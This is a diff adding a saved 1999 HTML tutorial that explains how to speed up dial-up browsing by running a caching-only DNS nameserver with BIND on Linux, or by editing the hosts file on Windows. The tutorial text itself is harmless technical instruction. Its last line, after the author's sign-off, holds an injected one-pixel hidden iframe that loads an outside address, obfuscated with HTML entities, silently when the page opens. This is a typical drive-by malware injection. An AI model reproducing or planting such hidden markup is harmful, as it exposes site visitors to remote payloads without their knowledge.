@@ -1,0 +1,184 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0035)http://blacksun.box.sk/caching.html -->
+<HTML><HEAD><TITLE>Setting up a caching only nameserver</TITLE>
+<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
+<META content="MSHTML 5.00.2614.3500" name=GENERATOR></HEAD>
+<BODY>
+<CENTER>
+<H1>Speeding up your internet connection under Linux and Windows</H1></CENTER>
+<CENTER>
+<H1>(Setting up DNS caching)</H1></CENTER>Last update 3-12-1999 by GoMoRRaH 
+<BR>GoMoRRaH is a member of Black Sun Research Facility (BSRF). <BR>More 
+tutorials on subjects such as hacking, cracking, phreaking, Unix, Windows and 
+Windows NT, networking, hardware and overclocking, programming, HTML and more at 
+http://blacksun.box.sk 
+<P>www.xxxxx.com is used as a non-existent site, as an exemple 
+<H2>1 Good old dry theory</H2>
+<H3>1.1 Introduction</H3>The internet is going thru an evolution, faster pc's, 
+more reliable connections etc... But the greatest evolution are the capacity of 
+the lines. What where telephone line are now ISDN lines or cable modems. But 
+there are still people (unfortunate people like me) who have such a sloppy 
+telephone line, which is sloooooow. So people are beginning to search ways to 
+speed up their connection. Their are tools like download managers, tools that 
+download the underlying pages of a visited web site in idle times. And so there 
+are many ways that go to adjusting the hardware of your modem. 
+<P>Like you all see the software is either Windows based or lets you fuck up 
+your hardware. This way is for Linux and is so easy a Windows user could do it 
+:P <BR>There is also an explanation on how to do the exact same thing under 
+Windows 
+<H3>1.2 Who should be reading this document, requirements</H3>Everyone who wants 
+to speed up their (modem) dial-up account by some seconds. And want to do this 
+in five minutes (if not less). 
+<P>Before asking any questions, please make sure you have read at least the 
+basic networking tutorials at blacksun.box.sk. <BR>If you still have questions 
+regarding this tutorial, please make sure you've already read at least some of 
+the basic networking tutorials at blacksun.box.sk. Also, please do not Email any 
+member of BSRF directly. There is a message board at blacksun.box.sk - use it. 
+<P>Information on how to do the same thing under Windows can be found at the 
+bottom of the tutorial. 
+<P>Requirements 
+<UL>
+  <LI>A computer 
+  <LI>A dial-up connection to the internet 
+  <LI>Linux up and running 
+  <LI>Named installed (1) 
+  <LI>5 minutes of time 
+  <LI>Some spare change for me (*grin*) </LI></UL><I>(1) Named is a the nameserver 
+package, this is standard and the most commone Linux distrubution and should 
+bring no problems while installing</I> 
+<H3>1.3 What does a nameserver do?</H3>What does a nameserver do ? Well, suppose 
+you are dialed in with you ISP and you wish to go to www.xxxxx.com. You open up 
+you browser and type in the URL box http://www.xxxxx.com, you press enter and 
+wait until xxxxx appears. <BR>Simple, isn't it ? Let's look behind the scenes to 
+find out what's really going on in here. 
+<OL>
+  <LI>Your computer gets the request to connect to www.xxxxx.com, but what is 
+  www.xxxxx.com ? Well it the alias of a computer (which has an ip) and has an 
+  httpd daemon running (on port 80). 
+  <LI>Your computers checks if that site isn't running on your own computer or 
+  on you local network. So it checks your /etc/hosts file (which has you local 
+  intranet information) or it checks a local nameserver (but because you're 
+  reading this I guess you don't have a nameserver installed (yet) so that won't 
+  be the case). By the way, this is a good chance to mention that 
+  DNS&nbsp;stands for Domain Name server. 
+  <LI>In fact your computer doesn't check if www.xxxxx.com is on your local 
+  network, it checks if it can find the ip of www.xxxxx.com on you local 
+  intranet. (You 'might' have heard once that the entire internet is tcp/ip 
+  based :P) 
+  <LI>Then your computer checks the file /etc/resolv.conf file should look like 
+  this. 
+  <P><BR><I>nameserver 123.123.123.123</I> </P>
+  <LI>This is the nameserver of you ISP. And when nothing can be found on the 
+  local intranet you computer will query this nameserver. (if this nameserver is 
+  unreachable the you'll get an error). 
+  <LI>When this nameserver is reachable it will answer with an ip. If 
+  www.xxxxx.com is unknown to the nameserver it will query some other 
+  nameserver. But in the end you'll get your ip. 
+  <LI>Once this ip (lets say 123.123.123.111) is known there will be tried to 
+  establish a connection to 123.123.123.111:80 (this connection will be made by 
+  the standard routing procedure as can be viewed by typing <I>route</I> from a 
+  root shell. </LI></OL>Now the communication will be established, files will be 
+transferd using the http protocol. So the nameserver simply translates 
+www.xxxxx.com into an ip by quering its own databases or querying other 
+databases. 
+<H3>1.4 Whooow that sounds very cool !!! So ? :p</H3>Well suppose those seven 
+steps take about 2 seconds (if you have a speedy connection and your ISP has a 
+nameserver with almost no network traffic and if the ip is in the nameservers 
+cache). So if this was an utopia it would take two seconds. So in these times 
+it'll take a bit longer. In this tutorial we'll make something called 'a caching 
+only nameserver'. 
+<H3>1.5 What is a caching only nameserver</H3>Well, this is a special 'type' of 
+nameserver. This is not intended to be the nameserver of your intranet. The only 
+thing it does is to cache all names and ip's that are queried from the local 
+network. The first time you query an ip, an other database has to be queried 
+(isp). But any other time that query does not have to find place. It is on you 
+own hard disk, so it doesn't consume any bandwidth, and site will come up some 
+seconds faster on your screen which makes surfing a lot more FUN. You can say 
+now what the hell are two seconds? Yes but how often do you go to a search 
+engine ? How often do you go to you favorite site and further, how often doe you 
+check your e-mail ? (once every 10 minutes is a Netscape default) 
+<P>Here ends the theory, now you should be able to understand what a caching 
+only nameserver does and how it can speed up you connection with a few seconds, 
+now go ahead and type something. 
+<H2>2 Fuck that damned theory, let me type something</H2>
+<H3>2.1 named.conf</H3>First we edit the general config file of the nameserver. 
+The file is called /etc/named.conf and it should look like: <PRE><I>options {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; directory "/var/named";
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Some shit */
+};
+....</I></PRE>This first part of the file is the one that needs changes. For 
+this you need to know the nameserver of your ISP (NOT the name but the IP !!!), 
+you change the file to: <PRE><I>options {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; directory "/var/named";
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; forwarders {
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 123.123.123.123;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 123.123.123.124;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };
+};
+....</I></PRE>You've now simple said that an unknown query has to be forwarded 
+to the ip's above. If the first is not reachable the second one will be tried. 
+<H3>2.2 Changing the nameserver</H3>In fact you have now an up and (almost) 
+running nameserver. There is just one little detail you have to take care of, 
+that's the fact that your computer doesn't recognize / will use you nameserver 
+yet. You have to edit <I>/etc/resolv.conf </I>. And you should edit the file so 
+it'll look like: <PRE><I># nameserver 321.321.321.321
+nameserver 127.0.0.1</I></PRE>The first line was your original nameserver, just 
+comment this (you never know ...) and then you add the line <I>nameserver 
+127.0.0.1 </I>this just says that queries no longer have to be forwarded but can 
+be answered by you OWN local nameserver. 
+<H3>2.3 Up and running</H3>Now you just have to (re)start your nameserver with 
+<I>killall -HUP named </I>. Then you check you logs ( /var/log/messages ) and 
+hope they'll look like <PRE>Nov 20 13:29:34 SaTaN named[692]: starting.&nbsp; named 8.2.1 Fri Sep 24 14:52:24 EDT 1999 ^Iroot@porky.devel.redhat.com:/usr/src/bs/BUILD/bind-8.2.1/src/bin/named
+Nov 20 13:29:34 SaTaN named[692]: hint zone "" (IN) loaded (serial 0)
+Nov 20 13:29:34 SaTaN named[692]: Zone "0.0.127.in-addr.arpa" (file named.local): No default TTL set using SOA minimum instead
+Nov 20 13:29:34 SaTaN named[692]: master zone "0.0.127.in-addr.arpa" (IN) loaded (serial 1997022700)
+Nov 20 13:29:34 SaTaN named[692]: listening on [127.0.0.1].53 (lo)
+Nov 20 13:29:34 SaTaN named[692]: listening on [10.0.0.1].53 (eth0)
+Nov 20 13:29:34 SaTaN named[692]: Forwarding source address is [0.0.0.0].1025
+Nov 20 13:29:34 SaTaN named: named startup succeeded
+Nov 20 13:29:34 SaTaN named[693]: Ready to answer queries.
+Nov 20 13:29:34 SaTaN named[693]: sysquery: sendto([123.123.123.123].53): Network is unreachable</PRE>If 
+you see a last line, like mine, don't worry about it. It means you are not yet 
+connected to the internet. When you get some erros, it means that you have not 
+edited you config file properly so you have check it again. (hint: check if all 
+the ; are in place and every { is closed with an } ) 
+<H3>2.4 U don't believe me ?</H3>Ok, for everyone who doesn't believe me ... <PRE><I>[root@SaTaN /] nslookup www.iwanttoquerythis.com
+Server: localhost
+Address: 127.0.0.1
+
+Name: www.iwanttoquerythis.com
+Address: 123.123.123.321 ... other ip's ..
+Aliases: If available ...</I></PRE>This was the first query and a request was 
+sent to the nameserver mentioned in the config file. For this far you know you 
+nameserver can forward addresses :p it's a start. <PRE><I>[root@SaTaN /] nslookup www.iwanttoquerythis.com
+Server: localhost
+Address: 127.0.0.1
+
+NON-AUTHORITIVE ANSWER
+Name: www.iwanttoquerythis.com
+Address: 123.123.123.321
+Aliases: ...</I></PRE>Cool, it says Non-authoritive answer. What does it means ? 
+Well, it just wants to say that for that answer there was no need to forward the 
+request, cool huh ? <BR>&nbsp; 
+<H3>2.5 And here's another way to do it</H3>You can also manage your local DNS 
+database by yourself! Simply add lines to the /etc/hosts file that will look 
+like this: <BR>IP-address hostname #comment <BR>For example: <BR>1.2.3.4 
+www.some-website.com #just another stupid website <BR>In case you're wondering, 
+you don't HAVE to put a comment...&nbsp; :p <BR>Oh, by the way, this method is 
+inferior because you have to enter IPs and hostnames by yourself... ouch... 
+<BR>&nbsp; 
+<H3>2.6 Local DNS cache under Windows</H3>Hello, poor Windows users. Want to 
+make yourself a nice local DNS cache? Too bad, 'cause you can only use the 
+method described in chapter 2.5, only you will be using c:\windows\hosts (not to 
+be confused with c:\windows\hosts.sam, which is a sample file for 
+c:\windows\hosts) instead of /etc/hosts. If you don't wanna do this manually, 
+you could try and find a program called FastNet, which will scan your browser's 
+bookmarks and history database and automatically add every URL you visit to this 
+database, and will also let you add entries manually. 
+<H2>3 The end</H2>
+<H3>3.1 Outro</H3>You should be able to put up you own caching only nameserver. 
+What else is there to say, if you want to know something more about it, you can 
+mail to GoMoRRaH and this file was written for <A 
+href="http://www.blacksun.box.sk/">Black sun Research Facility</A> 
+<P>GoMoRRaH WiLL RiSe aGaiN </P><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
